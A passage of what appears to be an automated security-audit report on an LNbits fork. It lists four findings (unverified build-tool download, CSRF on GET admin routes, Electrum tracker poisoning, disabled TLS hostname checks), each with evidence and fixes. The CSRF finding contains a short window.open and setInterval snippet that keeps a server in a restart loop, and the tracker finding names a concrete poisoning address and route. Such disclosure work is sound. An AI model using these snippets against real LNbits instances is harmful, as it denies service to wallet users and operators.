./appimagetool-x86_64.AppImage packaging/linux/AppDir "$APPIMAGE_NAME"
```

`continuous` is a floating release asset of a third-party project that is rebuilt and replaced whenever that project's CI runs; nothing in the workflow pins a release, compares a checksum or verifies a signature. The downloaded binary is then executed inside a job that (a) holds `contents: write` on `lnbits/lnbits` and (b) produces the exact bytes that are uploaded as `LNbits-<tag>.AppImage` to the public GitHub release — the asset `docs/guide/installation.md` tells Linux users to download and run.

Anyone who can replace that asset — a maintainer of AppImage/AppImageKit, an attacker who compromises that repository, its CI or its release credentials, or a GitHub-side substitution — therefore controls (1) the content of every LNbits Linux desktop release built after the swap, since appimagetool writes the final runtime+squashfs image and can embed arbitrary code or alter the bundled `dist/lnbits` binary, and (2) a write-capable token to the LNbits repository during the run. The downstream smoke test (`smoke.py`) only checks that the AppImage starts, serves assets and shuts down.

This is the odd one out in the release pipeline: the sidecar runtimes are fetched by pinned version with sha256 verification (`.github/packaging/prepare_sidecars.py:16-30`, `sidecars/pins.json`; `packaging/README.md:64-66`: "A failed download or checksum mismatch fails the build without falling back to a branch or a newer release"), PyInstaller is pinned (`pyinstaller==6.22.2`), Python dependencies are locked (`uv sync --locked`), and the Windows/macOS workflows grant the build job only `contents: read`, reserving `contents: write` for a separate upload job (macOS additionally verifies `.dmg.sha256` before upload). The AppImage packer alone is a mutable, unverified download executed under the write token.

Dependency assumption (not verifiable from the checkout): the AppImage/AppImageKit `continuous` release asset remains a rolling, replaceable artifact controlled by that project; appimagetool is also understood to fetch the AppImage runtime it embeds at run time unless given a local runtime, which would make the shipped runtime a second unpinned upstream input.

The LNbits desktop build runs a wallet that holds funding-source credentials and (via the bundled phoenixd/spark sidecars) seed mnemonics on the end user's machine, so a tampered AppImage is a direct path to users' funds and keys.

## Evidence
1. [.github/workflows/appimage.yml:111–115](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/workflows/appimage.yml#L111-L115)
   The release job downloads appimagetool-x86_64.AppImage from the floating 'continuous' release of the third-party AppImage/AppImageKit repository with plain wget, with no version pin, checksum or signature check, marks it executable and runs it to assemble LNbits-<tag>.AppImage from the AppDir. This is the code the fix must change.
2. [.github/workflows/appimage.yml:124–128](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/workflows/appimage.yml#L124-L128)
   The artifact produced by that tool is uploaded straight to the GitHub release for the tag with the job's contents:write GITHUB_TOKEN (--clobber), so whatever appimagetool emitted becomes the official Linux desktop download.
3. [.github/workflows/appimage.yml:18–19](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/workflows/appimage.yml#L18-L19)
   The whole workflow runs with contents: write, so code executing inside appimagetool also holds a token able to replace any release asset or push to unprotected refs; windows.yml:16-17/65-66 and macos.yml:29-30/101-102 instead confine contents:write to a separate upload job.
4. [.github/workflows/appimage.yml:121–122](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/workflows/appimage.yml#L121-L122)
   The only post-build check is a functional smoke test of the AppImage (.github/packaging/smoke.py: start, GET /, bundle.min.js, profiler, shut down); it cannot detect added payload.
5. [.github/workflows/release.yml:90–94](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/workflows/release.yml#L90-L94)
   appimage.yml is invoked for every stable release tag (and by release-rc.yml:79-83 for RCs), so the unpinned fetch is on the path of every shipped Linux desktop build.
6. [.github/packaging/prepare\_sidecars.py:16–30](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/packaging/prepare_sidecars.py#L16-L30)
   The project's own standard for build-time binary downloads: every sidecar (Node, Spark, phoenixd) is fetched by pinned version and its sha256 compared against sidecars/pins.json, failing the build on mismatch (README.md:64-66). The appimagetool fetch is the one download in the release pipeline without this control.
7. [docs/guide/installation.md:48–54](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docs/guide/installation.md#L48-L54)
   The documented Linux install path tells users to download and run exactly this release asset (LNbits-<tag>.AppImage from GitHub releases), establishing that the artifact appimagetool emits reaches end users' machines.

## Impact
The vulnerable system is the LNbits release pipeline/repository: arbitrary code runs in a job holding a contents:write GITHUB_TOKEN, allowing any release asset to be replaced (gh release upload --clobber is not restricted to the current tag) or unprotected refs pushed (integrity HIGH). release.yml:90-94 passes no other secrets to appimage.yml, so disclosure is limited to the GITHUB_TOKEN and public repository state (confidentiality LOW); the job can be made to fail or hang (availability LOW). Subsequent-system impact: The tampered AppImage is published as the official Linux desktop release (docs/guide/installation.md:48-54) and runs on end users' machines with their session privileges, holding funding-source credentials and the phoenixd/spark seed mnemonics the launcher manages; a backdoored build yields full compromise of those users' wallets and hosts.

## Reproduction steps
1. Attacker position: control over the AppImage/AppImageKit 'continuous' release asset (upstream maintainer, upstream repository/CI/credential compromise, or substitution in transit at GitHub) — a condition outside the attacker's control of LNbits, hence AT PRESENT. Delivery is automatic: the next release tag push or manual dispatch downloads and runs the trojaned tool, which emits the release artifact and runs with a contents:write GITHUB_TOKEN. No LNbits privileges are needed and no human interacts with attacker-supplied content; end users then download the official release asset from GitHub as the installation guide instructs.

## Recommended fix
1. The release job executes a build tool obtained from a mutable third-party release channel without pinning or integrity verification, so the integrity of the shipped artifact depends on an upstream the project does not control. Fix criteria: The AppImage packer used in release builds is a fixed, versioned artifact whose bytes are verified (checksum or signature committed to the repository, or vendored/pinned via the distro) before execution; replacing the upstream 'continuous' asset no longer changes what the workflow runs or ships. Verify by confirming the workflow fails closed when the downloaded tool does not match the committed digest.
2. The build step that runs third-party tooling executes under a contents:write token, widening the blast radius of any compromise of that tooling. Fix criteria: The build job runs with contents: read and only a separate upload job (consuming the built artifact) holds contents: write, matching the pattern already used in windows.yml and macos.yml.

---
**Severity:** HIGH
**Status:** Open
**Category:** Download of Code Without Integrity Check
**CWE:** [CWE-494](https://cwe.mitre.org/data/definitions/494.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257533

---

# Server restart and other state-changing admin actions exposed on cookie-authenticated GET endpoints (CSRF)

## Details
LNbits exposes several state-changing administrative actions on HTTP GET routes that are authenticated purely by the browser session cookie, with no CSRF protection:

- GET /admin/api/v1/restart (check_super_user) sets the multiprocessing event server_restart; lnbits/server.py then terminates the uvicorn worker and starts a new one, so the whole instance (every user, wallet, LNURL/webhook/payment endpoint) is unavailable for the restart plus full startup (migrations, extension re-import, funding source connection with retry/backoff).
- GET /admin/api/v1/testemail (check_admin) sends an email from the operator's configured SMTP identity to every configured recipient.
- GET /admin/api/v1/backup (check_super_user) runs pg_dump and shutil.make_archive over the entire data folder and writes lnbits-backup.zip into the process CWD.

Authentication for these routes comes from check_access_token (lnbits/decorators.py:251-257), which falls back to the cookie_access_token cookie when no Authorization header is present. That cookie is issued with samesite="lax" (auth_api.py:719-726). Lax is sent on cross-site top-level navigations using safe methods, so a GET the browser performs as a navigation carries the super user's session. There is no Origin/Referer/Sec-Fetch-Site check, no CSRF token, and the middleware stack adds none.

Attack: an anonymous attacker hosts a page the super user (or any admin, for testemail) visits while logged in to LNbits. The page performs `w = window.open('https://lnbits.example/admin/api/v1/restart/')` (or an `<a>`/meta-refresh/location assignment). The browser attaches the Lax cookie; check_super_user passes; the server restarts. Because the opener keeps a handle to the popup, the attacker page can re-navigate it (`setInterval(() => w.location = url, 10000)`) and keep the instance in a restart loop for as long as the victim keeps the attacker's tab open, denying service to all users and interrupting in-flight payment/webhook handling. The super user's own UI (admin.js:283-295) performs exactly this request, confirming nothing beyond the cookie is required.

The PUT/PATCH/DELETE settings routes are not reachable this way because Lax does not send the cookie on cross-site non-GET requests; the defect is specific to the actions placed on GET.

Note: this is not volumetric — a single forged request causes the outage — and it is distinct from the recorded SSO login-CSRF finding (sso-callback-login-csrf-unbound-state), which concerns a different endpoint and impact.

## Evidence
1. [lnbits/core/views/admin\_api.py:260–267](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L260-L267)
   GET /admin/api/v1/restart is a state-changing endpoint: it calls server_restart.set() and returns success. Its only guard is Depends(check_super_user); nothing checks the request method semantics, Origin/Referer, Sec-Fetch-Site or a CSRF token.
2. [lnbits/decorators.py:251–256](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L251-L256)
   check_access_token accepts the session from the cookie_access_token cookie when no Authorization header is present (header_access_token or cookie_access_token or bearer_access_token). A browser-initiated top-level navigation carries no header, so the cookie alone authenticates the request.
3. [lnbits/decorators.py:422–450](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L422-L450)
   check_admin / check_super_user only compare the resolved account id with settings.super_user; they do not distinguish a cookie-authenticated cross-site navigation from a deliberate in-app request.
4. [lnbits/core/views/auth\_api.py:719–725](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L719-L725)
   The session cookie cookie_access_token is set with samesite="lax". Lax cookies are attached to cross-site top-level GET navigations (link click, window.open, location assignment, meta refresh), which is exactly the request shape the restart endpoint accepts.
5. [lnbits/server.py:79–87](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/server.py#L79-L87)
   When the event is set, the supervisor loop sleeps 3s, terminates the uvicorn worker process, joins it, sleeps 1s and starts a new one, which then re-runs full startup (migrations, extension loading, funding-source connection with retries). Every user of the instance loses service for that period. The Event is shared with the forked worker (Docker: python:3.12 on Linux, console script lnbits.server:main), so the UI restart feature — and the forged request — actually work in production.
6. [lnbits/core/services/two\_factor.py:292–317](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/two_factor.py#L292-L317)
   The only step-up control on the session path, security_operation(), returns False for every GET except the SSO/reset_password paths, so even with 2FA enabled check_two_factor_session never demands a fresh mfa_time for GET /admin/api/v1/restart, /backup or /testemail; the Lax cookie alone suffices.
7. [lnbits/static/js/pages/admin.js:283–294](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/pages/admin.js#L283-L294)
   The legitimate UI reproduces the attack shape exactly: a plain GET to /admin/api/v1/restart/ with no body and no anti-CSRF token, confirming nothing more than the cookie is needed (and admin.js:369 opens /admin/api/v1/backup as a top-level window.open navigation, i.e. the exact cross-site-reachable shape).
8. [lnbits/core/views/admin\_api.py:81–92](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L81-L92)
   Secondary sink with the same root cause: GET /admin/api/v1/testemail (check_admin, any admin's Lax cookie) sends an email from the operator's SMTP account to all configured recipients on every cross-site navigation.
9. [lnbits/core/views/admin\_api.py:270–308](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L270-L308)
   Secondary sink with the same root cause: GET /admin/api/v1/backup (check_super_user) runs pg_dump and make_archive over the whole data folder, writing lnbits-backup.zip into the process CWD on every cross-site navigation (the attacker does not receive the file, but forces the expensive archive and disk write).
10. [lnbits/app.py:201–213](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L201-L213)
   The middleware stack (CORS, GZip, Audit, Session, InstalledExtension, ExtensionsRedirect) contains no CSRF, Origin or Sec-Fetch-Site enforcement; CORS does not affect top-level navigations. The admin router is included unconditionally (core/__init__.py:39), independent of LNBITS_ADMIN_UI.

## Impact
Availability: the whole LNbits process restarts on each forged request and the attacker can chain restarts for the lifetime of the victim's tab, taking down wallets, payment APIs, LNURL callbacks and webhooks for all users; in-flight operations are interrupted. Confidentiality: none — the attacker never reads a response. Integrity: low — the testemail sink sends unsolicited messages from the operator's identity and the backup sink writes archives to the server filesystem, but no data is altered.

## Reproduction steps
1. Attacker: anyone who can get a logged-in super user (restart/backup) or admin (testemail) to load a page they control. Delivery: a link, embedded redirect, or popup; the browser performs a top-level GET to the LNbits origin with the Lax session cookie. check_super_user accepts the cookie session; server_restart.set() runs. The attacker may re-navigate the popup repeatedly to sustain the outage. No special configuration is needed; default cookie attributes and default middleware are sufficient. Requires the victim to be logged in and to open the attacker's page (passive interaction).

## Recommended fix
1. State-changing administrative operations (server restart, backup generation, sending email) are bound to HTTP GET routes, so a browser will perform them as a side-effect of a cross-site top-level navigation. Fix criteria: Restart, backup and test-email are no longer triggerable by a GET request; they require a non-safe method (POST/DELETE) so that a cross-site top-level navigation cannot invoke them. Verify that navigating a logged-in super user's browser to /admin/api/v1/restart/ (and /backup, /testemail) does not restart the server, create an archive or send mail, while the admin UI continues to work through its updated calls.
2. Cookie-authenticated admin endpoints have no cross-site request forgery defence beyond SameSite=Lax, which does not cover GET navigations; the dependency chain check_access_token → check_admin → check_super_user treats a cookie-only cross-site request as equivalent to an in-app one. Fix criteria: Requests authenticated solely by the session cookie to state-changing admin routes are rejected unless they demonstrably originate from the LNbits origin (e.g. same-origin Origin/Sec-Fetch-Site check or a synchroniser/double-submit token the UI sends), or the session cookie is issued with SameSite=Strict for admin actions. Verify a cross-site request carrying a valid super-user cookie to any state-changing admin route receives a 4xx and has no effect.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-Site Request Forgery
**CWE:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257532

---

# Anonymous WebSocket can poison shared Electrum address tracker, halting on-chain tracking for all

## Details
The block explorer's live address updates (used by the explorer page and the core on-chain wallet UI, `lnbits/static/js/onchain/live-updates.js:80-92`) and the extension-facing `track_address` API share one `AddressTracker` instance (`lnbits/task_manager.py:253-266`), which multiplexes every tracked address over a single Electrum connection. `_sync_subscriptions` (`lnbits/utils/electrum.py:762-774`) walks `_ref_counts` in insertion order and, for each address not yet subscribed, awaits `subscribe_scripthash` and then `_fetch_and_dispatch` (balance/history/mempool) with no per-address error handling; `_run_once` (756-760) has none either. Any `ElectrumError` raised for one address (any JSON-RPC error object, electrum.py:459-461, or the 30 s RPC timeout, 449-452) therefore aborts the whole loop, unwinds the `async with ElectrumClient` block (closing the shared connection) and lands in `run()` (728-737), which sleeps 5 s and reconnects with an empty `subscribed` map, only to fail again at the same address.

An unauthenticated client controls which addresses enter `_ref_counts`: `GET /blockexplorer/api/v1/ws/address/{address}` (`lnbits/core/views/blockexplorer_api.py:155-171`) checks only `lnbits_blockexplorer_enabled` (default True) and calls `task_manager.register_ws_address_queue`, which validates only the address encoding (task_manager.py:268-276) before `AddressTracker.register_queue`/`add`. Assumption (remote-service behaviour, not verifiable in this checkout): mainstream Electrum server implementations reject `blockchain.scripthash.subscribe` for addresses whose history exceeds a server-side limit — ElectrumX returns `history too large` once history reaches `max_send // 99` (about 10k txs at the default max_send); Blockstream's electrs fails with `TooPopular` above `--electrum-txs-limit` (default 500); Fulcrum enforces `max_history`. Every implementation bounds history responses, so for any configured server some well-known address (the genesis address with 40k+ txs, any exchange hot wallet) exceeds the limit. The attacker opens one WebSocket to e.g. `/ws/address/1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa` and keeps it open; the default server is `ssl://electrum.blockstream.info:50002` (settings.py:912-914).

Effect, deterministic and lasting as long as the socket is open:
1. Every address tracked after the poison entry (other users' explorer and on-chain wallet live-update sessions, and every address an extension registered via `track_address`) is never subscribed and never receives an initial or subsequent event — live on-chain deposit detection through this mechanism is silently dead for them. The on-chain wallet UI's 10 s fallback scan still refreshes balances, so the loss is of the live-update service, not of funds or the ledger.
2. Every address tracked before it is torn down and re-subscribed, re-fetched (3 RPCs each) and re-dispatched every ~5 s (electrum.py:808-843), spamming WS queues and listener callbacks with duplicate events and hammering the configured Electrum server with reconnect/TLS churn (by default a third-party public server, risking the operator's IP being throttled or banned, which would also degrade the REST explorer and on-chain wallet operations that share that server).

If the attacker connects early (e.g. after a restart), nothing is ever tracked. No authentication and a single idle connection suffice; SlowAPI rate limiting and the IP block list are HTTP middleware (`middleware.py:213,217`) and do not cover WebSocket upgrades (assumption on slowapi/starlette as pinned). Disconnecting and reconnecting repeats it at will. The regtest suite (`tests/regtest/test_electrum.py`) only exercises fresh addresses, so this error path is untested. The separately verified `blockexplorer-ws-routes-bypass-public-api-gate` covers the missing access gate on these WS routes; this finding is the distinct defect that a single caller-chosen address disables the shared tracker for all consumers, which holds even for a legitimately authorised user.

## Evidence
1. [lnbits/utils/electrum.py:762–773](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/utils/electrum.py#L762-L773)
   _sync_subscriptions iterates every address in the shared _ref_counts (insertion order) and, for each not yet subscribed, awaits client.subscribe_scripthash() then _fetch_and_dispatch() with no per-address try/except (the only try/except, 778-789, covers unsubscribe). One ElectrumError for one caller-chosen address (a server's 'history too large'/TooPopular rejection, or the 30 s RPC timeout at 449-452) propagates out and aborts the loop before later addresses are subscribed. This is the code the fix must change.
2. [lnbits/utils/electrum.py:723–759](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/utils/electrum.py#L723-L759)
   _run_once's while loop (756-760) has no error handling either, so the exception unwinds the `async with ElectrumClient` block, closing the shared connection. run() catches it, logs, sleeps 5 s and calls _run_once() again with a fresh `subscribed` map, so every retry re-subscribes and re-fetches all addresses ahead of the poison entry and fails again at the same point. is_active is settings.lnbits_running, so the loop never gives up while the poison address remains in _ref_counts.
3. [lnbits/utils/electrum.py:808–842](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/utils/electrum.py#L808-L842)
   _fetch_and_dispatch re-raises any error from get_balance (second poison path) and, on every retry, pushes a new OnchainAddressEvent to every WS queue and the core callback for every address re-subscribed, so consumers receive repeated spurious events every ~5 s and the server receives 3 RPCs per address per retry.
4. [lnbits/core/views/blockexplorer\_api.py:155–171](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/blockexplorer_api.py#L155-L171)
   /blockexplorer/api/v1/ws/address/{address} is reachable by anyone: only lnbits_blockexplorer_enabled (default True) is checked, lnbits_blockexplorer_public_api is ignored and no user is required. The caller-chosen address is registered on the single shared tracker and stays registered for as long as the socket is held open.
5. [lnbits/task\_manager.py:268–276](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/task_manager.py#L268-L276)
   register_ws_address_queue validates only the address encoding (scripthash_from_address) and then hands it to the process-wide AddressTracker; nothing bounds the number or kind of addresses an anonymous client may add.
6. [lnbits/task\_manager.py:234–266](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/task_manager.py#L234-L266)
   track_address / _get_address_tracker show the same AddressTracker instance and the same single 'address_tracker' task serve extension listeners registered via register_onchain_listener, so the poison stalls their deposit notifications too.
7. [lnbits/utils/electrum.py:454–461](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/utils/electrum.py#L454-L461)
   _dispatch turns any JSON-RPC error object returned by the Electrum server into an ElectrumError on the pending future, which is what subscribe_scripthash/get_balance raise into _sync_subscriptions.
8. [lnbits/static/js/onchain/live-updates.js:80–91](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/onchain/live-updates.js#L80-L91)
   The core on-chain wallet UI opens /ws/address/{address} sockets (up to 8) through the same shared tracker for live balance updates, so legitimate users' live updates are among the consumers the poison silences; a 10 s fallback scan (live-updates.js:60-78) still refreshes balances, which bounds the impact to the live-update service.
9. [lnbits/settings.py:909–914](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L909-L914)
   lnbits_blockexplorer_enabled defaults to True and lnbits_blockexplorer_electrum_url defaults to Blockstream's public server, so a default install exposes the route and points the shared tracker at a third-party server whose history limits the operator does not control.

## Impact
Availability: the process-wide on-chain address tracking service (explorer and on-chain wallet live updates for every other user, and extension deposit notifications registered via track_address) stops delivering events for every address added after the poison and floods earlier ones with duplicates every ~5 s; the operator's single Electrum connection is torn down and re-established every 5 s. Core Lightning functionality, the ledger, and the on-chain wallet's 10 s fallback scan are not affected, so impact is rated LOW rather than HIGH; the dependency on unverified remote-server behaviour also caps the rating. No confidentiality or integrity effect.

## Reproduction steps
1. Anonymous attacker opens a single WebSocket to /blockexplorer/api/v1/ws/address/<busy address> on any instance with the block explorer enabled (default). The address passes format validation and is added to the shared tracker; the Electrum server rejects the subscription (assumed default behaviour of ElectrumX/electrs/Fulcrum, which all bound history responses — not verifiable in this checkout); the shared tracker enters a 5-second crash/reconnect loop for as long as the socket stays open. No credentials, no user interaction, no special network position; the route is gated only by lnbits_blockexplorer_enabled (default True). SlowAPI rate limiting and the IP block list are HTTP-scope middleware and do not constrain WebSocket upgrades.

## Recommended fix
1. A single failing scripthash subscription or balance fetch in _sync_subscriptions/_fetch_and_dispatch propagates out of the shared connection loop, so one caller-chosen address tears down the connection and denies tracking for every other address and every other consumer. Fix criteria: Per-address failures are isolated: the failing address is marked failed (its WS consumers notified or closed, and it is not retried on every reconnect) while all other addresses are subscribed and continue receiving events, and the shared connection is not torn down. Verify by tracking an address the server rejects alongside a valid one and confirming the valid one still receives its initial and subsequent events and that no reconnect loop occurs.
2. Anonymous callers can add arbitrary addresses to the tracker shared with privileged consumers, with no per-client bound and regardless of lnbits_blockexplorer_public_api. Fix criteria: WS address subscriptions honour the same access policy as the REST API, are bounded per client/IP, and public explorer traffic is served from a tracker or connection separate from the one that serves track_address listeners so it cannot affect extension deposit detection.

---
**Severity:** HIGH
**Status:** Open
**Category:** Improper exception handling
**CWE:** [CWE-755](https://cwe.mitre.org/data/definitions/755.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257529

---

# CLNRest backend disables TLS hostname verification for all node connections

## Details
CLNRestWallet._create_client (lnbits/wallets/clnrest.py:552-607) treats node authentication as a shipped control: plaintext is refused for non-loopback hosts (:558-566, which explicitly supports `https://` for external connections), a CA is mandatory (:573-580) and a SERVER_AUTH context is built from it (:585-595). It then sets `ssl_context.check_hostname = False` unconditionally (:599) and hands the context to httpx 0.27.2 as `verify=` (:602), so chain validation still happens but the certificate is never bound to the configured host or IP. The operator cannot re-enable the check, and the documented `clnrest_cert` / `server.pem` setting (settings.py:561, docs/guide/wallets.md:65, admin UI hint) is never read, so no pinning compensates.

Consequence: any certificate chaining to the configured CA is accepted as the node, whatever identity it was issued for. In the documented default (CLN's own `ca.pem`, docs/guide/wallets.md:64) the only such certificates are the node-issued `server.pem`/`client.pem`, whose holders (gRPC clients, readers of the lightning dir) already hold full node access, so the gain there is nil. The finding holds for the deployments the code explicitly supports but does not constrain: an external clnrest endpoint fronted by a reverse proxy with a public-CA certificate where `clnrest_ca` is the public chain (the setting accepts any PEM), or an organisational PKI whose CA also issues certificates to other services. There an on-path party holding any certificate from that CA for its own name impersonates the node.

The impostor receives the readonly/invoice/pay/renepay runes in plain `rune` headers on every request (:62-99, :443, :469) and controls the status truth LNbits acts on: `{"invoices":[{"status":"paid"}]}` to get_invoice_status (:436-461) makes update_pending_payment (core/services/payments.py:422-438) call update_payment_success_status and credit a wallet with no inbound funds, which the user later withdraws through the real node; `status: "failed"` to get_payment_status (:463-505) marks an outgoing payment failed and restores its balance after funds have left. Runes are node credentials, so their disclosure also reaches the funding node directly, bounded by the restrictions the operator baked in (docs show narrow examples). Part of ledger item x-fs-05.

## Evidence
1. [lnbits/wallets/clnrest.py:585–602](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/clnrest.py#L585-L602)
   SERVER_AUTH context built from the operator CA, then check_hostname unconditionally set False (:599) and passed to httpx as verify=; chain is validated but the certificate identity is never matched to the configured host/IP, and the operator has no setting to turn it back on.
2. [lnbits/wallets/clnrest.py:558–580](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/clnrest.py#L558-L580)
   Plaintext is refused off-loopback and https:// is explicitly offered for external connections with a mandatory CA: the project treats server authentication as a required control for remote nodes, so the identity check at :599 is the control's defect, not a documented fencing choice.
3. [lnbits/wallets/clnrest.py:62–99](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/clnrest.py#L62-L99)
   Readonly, invoice, pay and renepay runes are placed in plain 'rune' headers that every request sends to whichever peer passes the TLS handshake.
4. [lnbits/wallets/clnrest.py:436–505](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/clnrest.py#L436-L505)
   Invoice and payment truth ('paid'/'complete'/'failed') is taken from the peer's JSON with no other corroboration, so an impostor dictates what LNbits credits or refunds.
5. [lnbits/core/services/payments.py:422–438](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L422-L438)
   update_pending_payment applies the funding source's status directly: success → update_payment_success_status credits the wallet; failed → the outgoing payment is marked FAILED and its balance restored.
6. [lnbits/settings.py:560–561](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L560-L561)
   clnrest_cert (documented as the node's server.pem) is declared but never used by clnrest.py, so no certificate pinning compensates for the disabled hostname check.

## Impact
Confidentiality: every configured rune is disclosed to the impostor. Integrity: forged 'paid' statuses make update_pending_payment credit wallets with no inbound funds (later withdrawable through the real node), and forged 'failed' statuses restore balances for payments that have settled, corrupting the apipayments ledger. Availability: the waitanyinvoice stream and status checks can be stalled, a minor effect. Subsequent-system impact: The disclosed runes are credentials for the funding node, a separate system: the impostor can replay them against the real clnrest endpoint to read invoices/payments and to create invoices or pay within whatever restrictions the operator encoded (docs/guide/wallets.md:72-96 show narrow amount/rate limits; an unrestricted rune would raise this). Node availability is unaffected.

## Reproduction steps
1. The attacker interposes on the LNbits → clnrest connection (AT:P) and presents a certificate that chains to the configured CA but was issued for a different identity. Because check_hostname is False the handshake succeeds; the attacker reads the rune headers and forges status responses. Obtaining a same-CA certificate is the circumvention of the CA pin (AC:H): trivial where a public CA chain is configured, a membership precondition under an organisational PKI, and effectively unavailable in the documented default where CLN's own ca.pem issues only node-privileged certificates. No LNbits privileges or user interaction are needed.

## Recommended fix
Hostname/IP identity verification is disabled globally to accommodate IP-address endpoints, so the TLS layer authenticates the CA but not the node, and the documented server certificate setting is never used to pin the peer. Fix criteria: Bind the connection to the node's identity: keep check_hostname enabled against the configured host/IP (Python matches IP SANs when the node certificate carries one), and/or offer an explicit expected-server-name (SNI) setting for certificates whose SANs do not match the endpoint, and/or honour the already-documented clnrest_cert by pinning the node's server.pem; any opt-out must be explicit, default to verifying, and a certificate for a different identity signed by the same CA must be rejected.

---
**Severity:** HIGH
**Status:** Open
**Category:** Improper certificate validation
**CWE:** [CWE-297](https://cwe.mitre.org/data/definitions/297.html)
**Attack vector:** NETWORK
**Attack complexity:** HIGH
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
